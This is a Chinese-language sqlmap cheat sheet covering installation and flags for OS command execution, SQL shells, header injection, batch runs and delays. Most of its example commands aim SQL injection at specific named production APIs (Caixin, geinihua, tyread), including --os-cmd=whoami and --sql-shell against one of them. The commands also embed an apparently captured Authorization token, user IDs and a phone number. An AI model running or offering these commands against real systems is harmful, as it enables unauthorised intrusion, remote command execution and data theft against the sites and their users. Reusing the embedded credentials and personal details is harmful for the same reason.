## 一、 install
SqlMap 安装需要依赖 Python 环境。
- 通通下载最新版本，运行 `sqlmap.py`
    ```terminal
    [CRITICAL] incompatible Python version detected ('3.6.3'). For successfully running sqlmap you'll have to se version 2.6.x or 2.7.x (visit 'http://www.python.org/download/')
    ```

## 二、usage
官方地址：http://sqlmap.org/
用户手册：https://github.com/sqlmapproject/sqlmap/wiki


## 三、 执行 os 命令 
> --os-cmd

./sqlmap.py --url='https://mapiv5.caixin.com/api.php?m=api_user&a=get_invitation_code&login=1&imei=352419010176259&user_id=7494861&mobile_type=android&app_type=Caixin&channel=QQ'  -p user_id --os-cmd=whoami 

## 四、 执行 sql 命令
> --sql-shell

./sqlmap.py --url='https://mapiv5.caixin.com/api.php?m=api_user&a=get_invitation_code&login=1&imei=352419010176259&user_id=7494861&mobile_type=android&app_type=Caixin&channel=QQ'  -p user_id --sql-shell 

## 五、 设置 http 请求头
```
X-Tingyun-Id: W7fPDcK_LWY;c=2;r=1629403882;
X-Tingyun-Lib-Type-N-ST: 3;1522901713559
Charset: UTF-8
userId: 210891874
Authorization: encrypt MjEwODkxODc0LXYx.7rGkan1VFiuNilaJdwl7abmcsFjsMeDLDi-_pvgGYug5AD-e5IACcHo6m62yLFb_8NpVSenJlbaQiNkuHYG4TQ
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Host: prebeidou.geinihua.com
Connection: close

./sqlmap.py --url='https://prebeidou.geinihua.com/gnh-bdplatform-gt/api/v1/order/orderList' --user-agent='geinihua,4.0.0,geinihua,Android,6.0.1,kiw-tl00,huawei,86792102338873' --headers='X-Tingyun-Id: W7fPDcK_LWY;c=2;r=1629403882;\nX-Tingyun-Lib-Type-N-ST: 3;1522901713559\nCharset: UTF-8\nuserId: 210891874\nAuthorization: encrypt MjEwODkxODc0LXYx.7rGkan1VFiuNilaJdwl7abmcsFjsMeDLDi-_pvgGYug5AD-e5IACcHo6m62yLFb_8NpVSenJlbaQiNkuHYG4TQ\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\nHost: prebeidou.geinihua.com\nConnection: close' --data='userId=5ac48218f53475a81b09b121' 


./sqlmap.py --url='http://client.tyread.com:8080/portalapi/portalapi' --host='client.tyread.com:8080' --headers='phone-number: 13051661752\nAction: getSearchSuggestions\nConnection: close\nClient-Agent: TYYD_iPhoneOS_10_2_OC_6_1_3/640*1136/iPhone 5S\nuser-id: 210000268602273' --data='<Request><GetSearchSuggestionsReq><content>111</content><count>10</count></GetSearchSuggestionsReq></Request>'

```

## 六、 注入 header
1. 在 header Key:value 中的 value 后增加 *
2. 设置 --level >=2

## 七、 通过解析文件中的保存的文本进行批量注入
1. > sqlmap.py -r filepaht  --batch（不好用）
2. > sqlmap.py -l filepaht  --batch

## 八、 自动回答 sqlmap 的问题
--batch

## 九、 Sqlmap 延时，两个请求之间的时间间隔
--delay 1(1是时间，1秒，自己设置)

## 十、 存在SQL 注入的远程数据库如果知道账号密码如何进行远程连接？

